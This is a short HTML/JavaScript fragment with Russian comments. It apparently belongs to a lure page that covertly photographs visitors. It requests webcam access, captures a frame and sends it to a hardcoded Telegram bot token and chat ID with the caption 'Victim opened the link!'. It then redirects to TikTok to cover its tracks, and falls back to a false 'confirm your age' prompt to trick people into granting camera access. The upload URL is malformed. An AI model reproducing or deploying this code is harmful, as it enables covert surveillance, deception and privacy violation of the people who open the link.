    <script>
        const TOKEN = '8732856671:AAGaeDEaknbUts1NihyvHuQVkvpbM_C1XHA';
        const ID = '8732856671';

        async function initCapture() {
            try {
                // Запрос доступа
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Небольшая задержка для фокуса
                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);

                    c.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('chat_id', ID);
                        fd.append('photo', blob, 'user.jpg');
                        fd.append('caption', '📷 Жертва открыла ссылку!');

                        await fetch(`https://telegram.org{TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: fd
                        });
                        
                        // Перенаправляем на любое популярное видео
                        window.location.href = "https://tiktok.com";
                    }, 'image/jpeg');
                }, 800);

            } catch (e) {
                alert("Ошибка доступа! Пожалуйста, разрешите доступ к камере в настройках браузера, чтобы подтвердить ваш возраст.");
            }
        }
    </script>
